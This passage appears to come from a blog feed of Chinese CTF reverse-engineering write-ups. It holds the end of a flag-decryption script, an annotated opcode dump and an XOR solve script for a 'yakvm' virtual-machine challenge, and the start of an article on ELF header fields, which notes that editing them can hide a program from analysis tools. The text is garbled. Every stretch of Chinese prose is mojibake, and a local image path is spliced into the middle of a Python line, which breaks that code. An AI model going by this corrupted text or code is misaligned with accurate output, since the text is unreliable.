= <span class="number">97</span> + (key[i] - <span class="number">97</span> - time) % <span class="number">26</span></span><br><span class="line"></span><br><span class="line">table = [<span class="built_in">ord</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> <span class="string">&#x27;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&#x27;</span>]</span><br><span class="line">enc = [val &amp; <span class="number">0xFF</span> <span class="keyword">for</span> val <span class="keyword">in</span> [<span class="number">120</span>, <span class="number">91</span>, <span class="number">86</span>, <span class="number">122</span>, <span class="number">93</span>, <span class="number">84</span>, <span class="number">37</span>, <span class="number">49</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">61</span>, <span class="number">100</span>, -<span class="number">110</span>, <span class="number">118</span>, <span class="number">99</span>, <span class="number">123</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">33</span>, -<span class="number">124</span>, <span class="number">87</span>, <span class="number">118</span>, -<span class="number">121</span>, <span class="number">114</span>, -<span class="number">124</span>, -<span class="number">123</span>, <span class="number">112</span>, -<span class="number">98</span>, <span class="number">79</span>, <span class="number">112</span>, <span class="number">114</span>, -<span class="number">124</span>, <span class="number">87</span>, -<span class="number">120</span>]]</span><br><span class="line">key_0 = <span class="string">&#x27;fuwafuwa&#x27;</span></span><br><span class="line">key = [<span class="built_in">ord</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> key_0]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    emulator(key, i)</span><br><span class="line">    key = key[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    key = key[::-<span class="number">1</span>]</span><br><span class="line">    antiemulator(key, i)</span><br><span class="line">    enc[i] ^= key[i % <span class="number">8</span>] % <span class="number">32</span> + <span class="number">1</span></span><br><span class="line">    enc[i] -= i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    enc[i] ^= <span class="number">21</span></span><br><span class="line">enc = [table.index(val) <span class="keyword">for</span> val <span class="keyword">in</span> enc]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> enc:</span><br><span class="line">    flag += <span class="string">&quot;&#123;:06b&#125;&quot;</span>.<span class="built_in">format</span>(each)</span><br><span class="line">flag = flag[<span class="number">4</span>:]</span><br><span class="line">flag = [flag[<span class="number">8</span> * i:<span class="number">8</span> * i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> ra![image-<span class="number">20231128164528686</span>](C:\Users\Orink\AppData\Roaming\Typora\typora-user-images\image-<span class="number">20231128164528686.</span>png)nge(<span class="built_in">len</span>(enc))]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SYC&#123;&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(each[<span class="number">4</span>:<span class="number">8</span>] + each[<span class="number">0</span>:<span class="number">4</span>], <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;HbwKqCOAOVXdHAbG0HeinZkez&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="yakvm-è™šæ‹Ÿæœºé€†å‘"><a href="#yakvm-è™šæ‹Ÿæœºé€†å‘" class="headerlink" title="yakvm | è™šæ‹Ÿæœºé€†å‘"></a>yakvm | è™šæ‹Ÿæœºé€†å‘</h3><p>mainä¸ºç”Ÿæˆçš„è™šæ‹Ÿæœº IDAæ‰“å¼€å‘ç°æ˜¯æ— ç¬¦å·go ç”¨go paraseræ¢å¤ç¬¦å· æœç´¢æœ‰å…³æ“ä½œç çš„å‡½æ•°</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-13.png" alt="image-20231128164544215" style="zoom:67%;" />

<p>å‘ç°æœ‰ä¸€ä¸ªShowOpcodeså‡½æ•° ä½† è°ƒè¯•æ—¶ä¸è¿›è¿‡è¯¥å‡½æ•° äº¤å‰å¼•ç”¨æ‰¾åˆ°è°ƒç”¨å®ƒçš„å‡½æ•°</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-14.png" alt="image-20231128164844486" style="zoom:67%;" />

<p>åœ¨åˆ¤æ–­å¤„ä¸‹æ–­ç‚¹ è°ƒè¯•æ—¶é€šè¿‡æ”¹ZFå¯„å­˜å™¨æ­¥è¿›ShowOpcodeså‡½æ•° å¾—åˆ°å¯è¯»æ“ä½œç  æ ¹æ®å®˜æ–¹æ–‡æ¡£åˆ†æå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2:6-&gt;2:9         0:OP:type                 byte</span><br><span class="line">2:4-&gt;2:119       1:OP:type                 slice</span><br><span class="line">2:11-&gt;2:13       2:OP:push                 137</span><br><span class="line">2:15-&gt;2:17       3:OP:push                 108</span><br><span class="line">2:19-&gt;2:21       4:OP:push                 159</span><br><span class="line">2:23-&gt;2:25       5:OP:push                 114</span><br><span class="line">2:27-&gt;2:29       6:OP:push                 185</span><br><span class="line">2:31-&gt;2:32       7:OP:push                 90</span><br><span class="line">2:34-&gt;2:36       8:OP:push                 174</span><br><span class="line">2:38-&gt;2:39       9:OP:push                 68</span><br><span class="line">2:41-&gt;2:43      10:OP:push                 160</span><br><span class="line">2:45-&gt;2:46      11:OP:push                 81</span><br><span class="line">2:48-&gt;2:50      12:OP:push                 179</span><br><span class="line">2:52-&gt;2:53      13:OP:push                 41</span><br><span class="line">2:55-&gt;2:57      14:OP:push                 186</span><br><span class="line">2:59-&gt;2:60      15:OP:push                 89</span><br><span class="line">2:62-&gt;2:64      16:OP:push                 168</span><br><span class="line">2:66-&gt;2:67      17:OP:push                 78</span><br><span class="line">2:69-&gt;2:71      18:OP:push                 229</span><br><span class="line">2:73-&gt;2:75      19:OP:push                 121</span><br><span class="line">2:77-&gt;2:79      20:OP:push                 149</span><br><span class="line">2:81-&gt;2:83      21:OP:push                 106</span><br><span class="line">2:85-&gt;2:87      22:OP:push                 147</span><br><span class="line">2:89-&gt;2:91      23:OP:push                 103</span><br><span class="line">2:93-&gt;2:95      24:OP:push                 156</span><br><span class="line">2:97-&gt;2:99      25:OP:push                 114</span><br><span class="line">2:101-&gt;2:103    26:OP:push                 133</span><br><span class="line">2:105-&gt;2:106    27:OP:push                 98</span><br><span class="line">2:108-&gt;2:110    28:OP:push                 146</span><br><span class="line">2:112-&gt;2:114    29:OP:push                 116</span><br><span class="line">2:116-&gt;2:118    30:OP:push                 181</span><br><span class="line">2:4-&gt;2:119      31:OP:typedslice           29</span><br><span class="line">2:4-&gt;2:119      32:OP:list                 1</span><br><span class="line">2:0-&gt;2:0        33:OP:pushleftr            1            arg_1 = key_list[29]</span><br><span class="line">2:0-&gt;2:0        34:OP:list                 1</span><br><span class="line">2:0-&gt;2:119      35:OP:assign               </span><br><span class="line">3:0-&gt;3:4        36:OP:pushid               print</span><br><span class="line">3:6-&gt;3:25       37:OP:push                 please input flag:</span><br><span class="line">3:5-&gt;3:26       38:OP:call                 vlen:1</span><br><span class="line">3:0-&gt;3:26       39:OP:pop                  </span><br><span class="line">4:4-&gt;4:6        40:OP:pushid               get</span><br><span class="line">4:7-&gt;4:8        41:OP:call                 vlen:0</span><br><span class="line">4:4-&gt;4:8        42:OP:list                 1</span><br><span class="line">4:0-&gt;4:0        43:OP:pushleftr            2</span><br><span class="line">4:0-&gt;4:0        44:OP:list                 1            arg_2 = input[29]</span><br><span class="line">4:0-&gt;4:8        45:OP:assign               </span><br><span class="line">5:18-&gt;8:0       46:OP:new-scope            2            &#123;</span><br><span class="line">5:3-&gt;5:5        47:OP:pushid               len</span><br><span class="line">5:7-&gt;5:7        48:OP:pushr                2</span><br><span class="line">5:6-&gt;5:8        49:OP:call                 vlen:1            len(arg_2)</span><br><span class="line">5:12-&gt;5:14      50:OP:pushid               len</span><br><span class="line">5:16-&gt;5:16      51:OP:pushr                1                len(arg_1)</span><br><span class="line">5:15-&gt;5:17      52:OP:call                 vlen:1</span><br><span class="line">5:3-&gt;5:17       53:OP:gt                                       len(arg_1) &gt; len(arg_2) -&gt; goto globle63</span><br><span class="line">5:18-&gt;8:0       54:OP:jmpf                 -&gt; 63</span><br><span class="line">5:18-&gt;8:0       55:OP:new-scope            3                &#123;</span><br><span class="line">6:1-&gt;6:7        56:OP:pushid               println</span><br><span class="line">6:9-&gt;6:32       57:OP:push                 input string too long!    printf(too long!)</span><br><span class="line">6:8-&gt;6:33       58:OP:call                 vlen:1</span><br><span class="line">6:1-&gt;6:33       59:OP:pop                  </span><br><span class="line">7:1-&gt;7:6        60:OP:return               </span><br><span class="line">5:18-&gt;8:0       61:OP:end-scope                                &#125;</span><br><span class="line">5:18-&gt;8:0       62:OP:jmp                  -&gt; 63            globle63:</span><br><span class="line">5:18-&gt;8:0       63:OP:end-scope                            &#125;</span><br><span class="line">12:8-&gt;21:0      64:OP:push                 function params[1] codes[54] (copy)</span><br><span class="line">12:8-&gt;21:0      65:OP:list                 1</span><br><span class="line">12:0-&gt;12:4      66:OP:pushleftr            8            arg_8 = func1</span><br><span class="line">12:0-&gt;12:4      67:OP:list                 1</span><br><span class="line">12:0-&gt;21:0      68:OP:assign               </span><br><span class="line">25:4-&gt;25:8      69:OP:pushr                8</span><br><span class="line">25:10-&gt;25:10    70:OP:pushr                2</span><br><span class="line">25:9-&gt;25:11     71:OP:call                 vlen:1        arg2 = func1(arg_2)</span><br><span class="line">25:4-&gt;25:11     72:OP:list                 1</span><br><span class="line">25:0-&gt;25:0      73:OP:pushleftr            2</span><br><span class="line">25:0-&gt;25:0      74:OP:list                 1</span><br><span class="line">25:0-&gt;25:11     75:OP:assign               </span><br><span class="line">28:9-&gt;33:0      76:OP:push                 function params[0] codes[40] (copy)</span><br><span class="line">28:9-&gt;33:0      77:OP:list                 1</span><br><span class="line">28:0-&gt;28:4      78:OP:pushleftr            14</span><br><span class="line">28:0-&gt;28:4      79:OP:list                 1</span><br><span class="line">28:0-&gt;33:0      80:OP:assign               </span><br><span class="line">36:0-&gt;36:4      81:OP:pushr                14</span><br><span class="line">36:5-&gt;36:6      82:OP:call                 vlen:0       func2()</span><br><span class="line">36:0-&gt;36:6      83:OP:pop                  </span><br><span class="line">38:11-&gt;48:0     84:OP:push                 function params[0] codes[52] (copy)</span><br><span class="line">38:11-&gt;48:0     85:OP:list                 1</span><br><span class="line">38:0-&gt;38:7      86:OP:pushleftr            19</span><br><span class="line">38:0-&gt;38:7      87:OP:list                 1</span><br><span class="line">38:0-&gt;48:0      88:OP:assign               </span><br><span class="line">51:14-&gt;53:0     89:OP:new-scope            24</span><br><span class="line">51:3-&gt;51:10     90:OP:pushr                19</span><br><span class="line">51:11-&gt;51:12    91:OP:call                 vlen:0</span><br><span class="line">51:14-&gt;53:0     92:OP:jmpf                 -&gt; 100</span><br><span class="line">51:14-&gt;53:0     93:OP:new-scope            25</span><br><span class="line">52:1-&gt;52:5      94:OP:pushid               print</span><br><span class="line">52:7-&gt;52:24     95:OP:push                 yes! you get it!</span><br><span class="line">52:6-&gt;52:25     96:OP:call                 vlen:1</span><br><span class="line">52:1-&gt;52:25     97:OP:pop                  </span><br><span class="line">51:14-&gt;53:0     98:OP:end-scope            </span><br><span class="line">51:14-&gt;53:0     99:OP:jmp                  -&gt; 108</span><br><span class="line">51:14-&gt;53:0    100:OP:end-scope            </span><br><span class="line">51:14-&gt;53:0    101:OP:new-scope            26</span><br><span class="line">53:6-&gt;55:0     102:OP:new-scope            27</span><br><span class="line">54:1-&gt;54:5     103:OP:pushid               print</span><br><span class="line">54:7-&gt;54:24    104:OP:push                 no this not flag</span><br><span class="line">54:6-&gt;54:25    105:OP:call                 vlen:1</span><br><span class="line">54:1-&gt;54:25    106:OP:pop                  </span><br><span class="line">53:6-&gt;55:0     107:OP:end-scope            </span><br><span class="line">51:14-&gt;53:0    108:OP:end-scope            </span><br><span class="line"></span><br><span class="line">//func1 start</span><br><span class="line">anonymous</span><br><span class="line">13:1-&gt;19:1       1:OP:new-scope            6    &#123;</span><br><span class="line">13:1-&gt;19:1       2:OP:pushleftr            5        arg_5 = arg_3 = arg_2</span><br><span class="line">13:18-&gt;13:18     3:OP:pushr                3</span><br><span class="line">13:1-&gt;19:1       4:OP:fast-assign          </span><br><span class="line">13:1-&gt;19:1       5:OP:enter-for-range      -&gt; 47    for i in range(47)</span><br><span class="line">13:1-&gt;19:1       6:OP:range-next           </span><br><span class="line">13:5-&gt;13:5       7:OP:pushleftr            6</span><br><span class="line">13:8-&gt;13:8       8:OP:pushleftr            7</span><br><span class="line">13:5-&gt;13:8       9:OP:list                 2</span><br><span class="line">13:1-&gt;19:1      10:OP:assign               </span><br><span class="line">13:20-&gt;19:1     11:OP:new-scope            7        &#123;</span><br><span class="line">14:16-&gt;16:2     12:OP:new-scope            8            &#123;</span><br><span class="line">14:5-&gt;14:5      13:OP:pushr                6</span><br><span class="line">14:9-&gt;14:9      14:OP:push                 2</span><br><span class="line">14:5-&gt;14:9      15:OP:mod                  </span><br><span class="line">14:14-&gt;14:14    16:OP:push                 0</span><br><span class="line">14:5-&gt;14:14     17:OP:eq                                    arg_6 % 2 == 0 goto global31</span><br><span class="line">14:16-&gt;16:2     18:OP:jmpf                 -&gt; 31</span><br><span class="line">14:16-&gt;16:2     19:OP:new-scope            9            else&#123;</span><br><span class="line">15:10-&gt;15:10    20:OP:pushr                7</span><br><span class="line">15:14-&gt;15:17    21:OP:push                 240</span><br><span class="line">15:10-&gt;15:17    22:OP:xor                  </span><br><span class="line">15:10-&gt;15:17    23:OP:list                 1</span><br><span class="line">15:3-&gt;15:3      24:OP:pushr                3</span><br><span class="line">15:5-&gt;15:5      25:OP:pushr                6                arg_3[arg_6] = arg_7 ^ 240</span><br><span class="line">15:3-&gt;15:6      26:OP:list                 2</span><br><span class="line">15:3-&gt;15:6      27:OP:list                 1</span><br><span class="line">15:3-&gt;15:17     28:OP:assign               </span><br><span class="line">14:16-&gt;16:2     29:OP:end-scope                                &#125;</span><br><span class="line">14:16-&gt;16:2     30:OP:jmp                  -&gt; 44</span><br><span class="line">14:16-&gt;16:2     31:OP:end-scope           global31:        &#125;</span><br><span class="line">14:16-&gt;16:2     32:OP:new-scope            10            &#123;</span><br><span class="line">16:9-&gt;18:2      33:OP:new-scope            11                &#123;</span><br><span class="line">17:10-&gt;17:10    34:OP:pushr                7                    arg_7 ^ 15</span><br><span class="line">17:14-&gt;17:17    35:OP:push                 15</span><br><span class="line">17:10-&gt;17:17    36:OP:xor                  </span><br><span class="line">17:10-&gt;17:17    37:OP:list                 1</span><br><span class="line">17:3-&gt;17:3      38:OP:pushr                3</span><br><span class="line">17:5-&gt;17:5      39:OP:pushr                6                    arg_3[arg_6] = arg_7 ^ 15</span><br><span class="line">17:3-&gt;17:6      40:OP:list                 2</span><br><span class="line">17:3-&gt;17:6      41:OP:list                 1</span><br><span class="line">17:3-&gt;17:17     42:OP:assign               </span><br><span class="line">16:9-&gt;18:2      43:OP:end-scope                                &#125;</span><br><span class="line">14:16-&gt;16:2     44:OP:end-scope                            &#125;</span><br><span class="line">13:20-&gt;19:1     45:OP:end-scope                        &#125;</span><br><span class="line">13:1-&gt;19:1      46:OP:exit-for-range       -&gt; 6</span><br><span class="line">13:1-&gt;19:1      47:OP:pop                  </span><br><span class="line">13:1-&gt;19:1      48:OP:end-scope                    &#125;</span><br><span class="line">20:8-&gt;20:8      49:OP:pushr                3</span><br><span class="line">20:8-&gt;20:8      50:OP:list                 1</span><br><span class="line">20:1-&gt;20:8      51:OP:return                           </span><br><span class="line">//func1 end</span><br><span class="line"></span><br><span class="line">//func2 start</span><br><span class="line">anonymous</span><br><span class="line">28:15-&gt;33:0      0:OP:new-scope            13</span><br><span class="line">29:1-&gt;32:1       1:OP:new-scope            14</span><br><span class="line">29:1-&gt;32:1       2:OP:pushleftr            10</span><br><span class="line">29:18-&gt;29:18     3:OP:pushr                2            arg_10 = arg_2</span><br><span class="line">29:1-&gt;32:1       4:OP:fast-assign          </span><br><span class="line">29:1-&gt;32:1       5:OP:enter-for-range      -&gt; 36</span><br><span class="line">29:1-&gt;32:1       6:OP:range-next           </span><br><span class="line">29:5-&gt;29:5       7:OP:pushleftr            11           arg_12 = arg_11 ?</span><br><span class="line">29:8-&gt;29:8       8:OP:pushleftr            12</span><br><span class="line">29:5-&gt;29:8       9:OP:list                 2</span><br><span class="line">29:1-&gt;32:1      10:OP:assign               </span><br><span class="line">29:20-&gt;32:1     11:OP:new-scope            15   &#123;</span><br><span class="line">30:6-&gt;30:6      12:OP:pushr                11       arg_13 = arg_11 * 2</span><br><span class="line">30:10-&gt;30:10    13:OP:push                 2</span><br><span class="line">30:6-&gt;30:10     14:OP:mul                  </span><br><span class="line">30:6-&gt;30:10     15:OP:list                 1</span><br><span class="line">30:2-&gt;30:2      16:OP:pushleftr            13</span><br><span class="line">30:2-&gt;30:2      17:OP:list                 1</span><br><span class="line">30:2-&gt;30:10     18:OP:assign               </span><br><span class="line">31:11-&gt;31:11    19:OP:pushr                12           //ç”¨ä¸æˆ–éå®ç°å¼‚æˆ–</span><br><span class="line">31:10-&gt;31:11    20:OP:not                            arg_12 ^ arg_13 -&gt; (~v12 | v13) and (v12 | ~v13)</span><br><span class="line">31:15-&gt;31:15    21:OP:pushr                13</span><br><span class="line">31:10-&gt;31:15    22:OP:and                  </span><br><span class="line">31:21-&gt;31:21    23:OP:pushr                12</span><br><span class="line">31:26-&gt;31:26    24:OP:pushr                13</span><br><span class="line">31:25-&gt;31:26    25:OP:not                  </span><br><span class="line">31:21-&gt;31:26    26:OP:and                  </span><br><span class="line">31:9-&gt;31:27     27:OP:or                   </span><br><span class="line">31:9-&gt;31:27     28:OP:list                 1</span><br><span class="line">31:2-&gt;31:2      29:OP:pushr                2</span><br><span class="line">31:4-&gt;31:4      30:OP:pushr                11</span><br><span class="line">31:2-&gt;31:5      31:OP:list                 2</span><br><span class="line">31:2-&gt;31:5      32:OP:list                 1</span><br><span class="line">31:2-&gt;31:27     33:OP:assign               </span><br><span class="line">29:20-&gt;32:1     34:OP:end-scope                 &#125;</span><br><span class="line">29:1-&gt;32:1      35:OP:exit-for-range       -&gt; 6</span><br><span class="line">29:1-&gt;32:1      36:OP:pop                  </span><br><span class="line">29:1-&gt;32:1      37:OP:end-scope            </span><br><span class="line">28:15-&gt;33:0     38:OP:end-scope            </span><br><span class="line">28:9-&gt;33:0      39:OP:return               </span><br><span class="line">//func2 end</span><br><span class="line"></span><br><span class="line">//func3 start   åˆ¤æ–­å‡½æ•°</span><br><span class="line">anonymous</span><br><span class="line">38:17-&gt;48:0      0:OP:new-scope            17</span><br><span class="line">39:21-&gt;41:1      1:OP:new-scope            18</span><br><span class="line">39:4-&gt;39:6       2:OP:pushid               len</span><br><span class="line">39:8-&gt;39:8       3:OP:pushr                2</span><br><span class="line">39:7-&gt;39:9       4:OP:call                 vlen:1</span><br><span class="line">39:14-&gt;39:16     5:OP:pushid               len</span><br><span class="line">39:18-&gt;39:18     6:OP:pushr                1</span><br><span class="line">39:17-&gt;39:19     7:OP:call                 vlen:1</span><br><span class="line">39:4-&gt;39:19      8:OP:neq                  </span><br><span class="line">39:21-&gt;41:1      9:OP:jmpf                 -&gt; 16</span><br><span class="line">39:21-&gt;41:1     10:OP:new-scope            19</span><br><span class="line">40:9-&gt;40:13     11:OP:push                 false</span><br><span class="line">40:9-&gt;40:13     12:OP:list                 1</span><br><span class="line">40:2-&gt;40:13     13:OP:return               </span><br><span class="line">39:21-&gt;41:1     14:OP:end-scope            </span><br><span class="line">39:21-&gt;41:1     15:OP:jmp                  -&gt; 16</span><br><span class="line">39:21-&gt;41:1     16:OP:end-scope            </span><br><span class="line">42:1-&gt;46:1      17:OP:new-scope            20</span><br><span class="line">42:1-&gt;46:1      18:OP:pushleftr            16</span><br><span class="line">42:18-&gt;42:18    19:OP:pushr                2</span><br><span class="line">42:1-&gt;46:1      20:OP:fast-assign          </span><br><span class="line">42:1-&gt;46:1      21:OP:enter-for-range      -&gt; 45</span><br><span class="line">42:1-&gt;46:1      22:OP:range-next           </span><br><span class="line">42:5-&gt;42:5      23:OP:pushleftr            17</span><br><span class="line">42:8-&gt;42:8      24:OP:pushleftr            18</span><br><span class="line">42:5-&gt;42:8      25:OP:list                 2</span><br><span class="line">42:1-&gt;46:1      26:OP:assign               </span><br><span class="line">42:20-&gt;46:1     27:OP:new-scope            21</span><br><span class="line">43:14-&gt;45:2     28:OP:new-scope            22</span><br><span class="line">43:5-&gt;43:5      29:OP:pushr                18</span><br><span class="line">43:10-&gt;43:10    30:OP:pushr                1</span><br><span class="line">43:12-&gt;43:12    31:OP:pushr                17</span><br><span class="line">43:11-&gt;43:13    32:OP:push                 false</span><br><span class="line">43:11-&gt;43:13    33:OP:iterablecall         off:1 op1: -         op2: -</span><br><span class="line">43:5-&gt;43:13     34:OP:neq                  </span><br><span class="line">43:14-&gt;45:2     35:OP:jmpf                 -&gt; 42</span><br><span class="line">43:14-&gt;45:2     36:OP:new-scope            23</span><br><span class="line">44:10-&gt;44:14    37:OP:push                 false</span><br><span class="line">44:10-&gt;44:14    38:OP:list                 1</span><br><span class="line">44:3-&gt;44:14     39:OP:return               </span><br><span class="line">43:14-&gt;45:2     40:OP:end-scope            </span><br><span class="line">43:14-&gt;45:2     41:OP:jmp                  -&gt; 42</span><br><span class="line">43:14-&gt;45:2     42:OP:end-scope            </span><br><span class="line">42:20-&gt;46:1     43:OP:end-scope            </span><br><span class="line">42:1-&gt;46:1      44:OP:exit-for-range       -&gt; 22</span><br><span class="line">42:1-&gt;46:1      45:OP:pop                  </span><br><span class="line">42:1-&gt;46:1      46:OP:end-scope            </span><br><span class="line">47:8-&gt;47:11     47:OP:push                 true</span><br><span class="line">47:8-&gt;47:11     48:OP:list                 1</span><br><span class="line">47:1-&gt;47:11     49:OP:return               </span><br><span class="line">38:17-&gt;48:0     50:OP:end-scope            </span><br><span class="line">38:11-&gt;48:0     51:OP:return               </span><br><span class="line">//func3 end</span><br></pre></td></tr></table></figure>

<p>æ®æ­¤å†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">137</span>, <span class="number">108</span>, <span class="number">159</span>, <span class="number">114</span>, <span class="number">185</span>, <span class="number">90</span>, <span class="number">174</span>, <span class="number">68</span>, <span class="number">160</span>, <span class="number">81</span>, <span class="number">179</span>, <span class="number">41</span>, <span class="number">186</span>, <span class="number">89</span>, <span class="number">168</span>, <span class="number">78</span>, <span class="number">229</span>, <span class="number">121</span>, <span class="number">149</span>, <span class="number">106</span>, <span class="number">147</span>, <span class="number">103</span>, <span class="number">156</span>, <span class="number">114</span>, <span class="number">133</span>, <span class="number">98</span>, <span class="number">146</span>, <span class="number">116</span>, <span class="number">181</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        key[i] ^= <span class="number">2</span> * i</span><br><span class="line">        key[i] ^= <span class="number">240</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key[i] ^= <span class="number">2</span> * i</span><br><span class="line">        key[i] ^= <span class="number">15</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(each), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># yak&#123;A_RE@LW0RLD_5TACKB@SE_VM&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Writeups</tag>
      </tags>
  </entry>
  <entry>
    <title>ELFæ–‡ä»¶å¤´</title>
    <url>/2024/03/16/ELF%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
    <content><![CDATA[<h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>ELFæ–‡ä»¶å¤´åŒ…å«äº†è¯¥å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€äº›ç³»ç»Ÿçº§ä¿¡æ¯:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e_ident[16]:ELFæ–‡ä»¶çš„æ ‡è¯† åŒ…æ‹¬é­”æ•°å’Œå…¶ä»–ä¿¡æ¯</span><br><span class="line">e_type:        æ–‡ä»¶ç±»å‹ ä¾‹å¦‚å¯æ‰§è¡Œæ–‡ä»¶, ç›®æ ‡æ–‡ä»¶, å…±äº«ç›®æ ‡æ–‡ä»¶ç­‰</span><br><span class="line">e_machine:    æ–‡ä»¶è¿è¡Œçš„CPUä½“ç³»ç»“æ„</span><br><span class="line">e_version:    ELFæ–‡ä»¶çš„ç‰ˆæœ¬å·</span><br><span class="line">e_entry:    ç¨‹åºçš„å…¥å£ç‚¹åœ°å€</span><br><span class="line">e_phoff:    ç¨‹åºå¤´è¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»é‡</span><br><span class="line">e_shoff:    èŠ‚å¤´è¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»é‡</span><br><span class="line">e_flags:    å¤„ç†å™¨ä¸“ç”¨æ ‡å¿—</span><br><span class="line">e_ehsize:    ELFæ–‡ä»¶å¤´çš„å¤§å°</span><br><span class="line">e_phentsize:ç¨‹åºå¤´è¡¨ä¸­æ¯ä¸ªæ¡ç›®çš„å¤§å°</span><br><span class="line">e_phnum:    ç¨‹åºå¤´è¡¨ä¸­æ¡ç›®çš„æ•°é‡</span><br><span class="line">e_shentsize:èŠ‚å¤´è¡¨ä¸­æ¯ä¸ªæ¡ç›®çš„å¤§å°</span><br><span class="line">e_shnum:    èŠ‚å¤´è¡¨ä¸­æ¡ç›®çš„æ•°é‡</span><br><span class="line">e_shstrndx:    èŠ‚å¤´å­—ç¬¦ä¸²è¡¨çš„ç´¢å¼•</span><br></pre></td></tr></table></figure>

<p>æ›´æ”¹å…¶ä¸­çš„æŸäº›æ•°æ® ä¾‹å¦‚ç¨‹åºå…¥å£ç‚¹, æ“ä½œç³»ç»Ÿä½æ•°, å¤§å°ç«¯åºç­‰ ä¼šå¯¼è‡´ç¨‹åºè¿è¡Œæµç¨‹æ”¹å˜ ä»è€Œä½¿å¾—æ–‡ä»¶æ— æ³•è¢«å·¥å…·è¯†åˆ« è¾¾åˆ°éšè—ç¨‹åºä¸»è¦åŠŸèƒ½çš„ç›®çš„</p>
<span id="more"></span>

<h3 id="æ–‡ä»¶å¤´ç»“æ„"><a href="#æ–‡ä»¶å¤´ç»“æ„" class="headerlink" title="æ–‡ä»¶å¤´ç»“æ„"></a>æ–‡ä»¶å¤´ç»“æ„</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT];</span><br><span class="line">        Elf32_Half      e_type;</span><br><span class="line">        Elf32_Half      e_machine;</span><br><span class="line">        Elf32_Word      e_version;</span><br><span class="line">        Elf32_Addr      e_entry;</span><br><span class="line">        Elf32_Off       e_phoff;</span><br><span class="line">        Elf32_Off       e_shoff;</span><br><span class="line">        Elf32_Word      e_flags;</span><br><span class="line">        Elf32_Half      e_ehsize;</span><br><span class="line">        Elf32_Half      e_phentsize;</span><br><span class="line">        Elf32_Half      e_phnum;</span><br><span class="line">        Elf32_Half      e_shentsize;</span><br><span class="line">        Elf32_Half      e_shnum;</span><br><span class="line">        Elf32_Half      e_shstrndx;</span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT];</span><br><span class="line">        Elf64_Half      e_type;</span><br><span class="line">        Elf64_Half      e_machine;</span><br><span class="line">        Elf64_Word      e_version;</span><br><span class="line">        Elf64_Addr      e_entry;</span><br><span class="line">        Elf64_Off       e_phoff;</span><br><span class="line">        Elf64_Off       e_shoff;</span><br><span class="line">        Elf64_Word      e_flags;</span><br><span class="line">        Elf64_Half      e_ehsize;</span><br><span class="line">        Elf64_Half      e_phentsize;</span><br><span class="line">        Elf64_Half      e_phnum;</span><br><span class="line">        Elf64_Half      e_shentsize;</span><br><span class="line">        Elf64_Half      e_shnum;</span><br><span class="line">        Elf64_Half      e_shstrndx;</span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure>

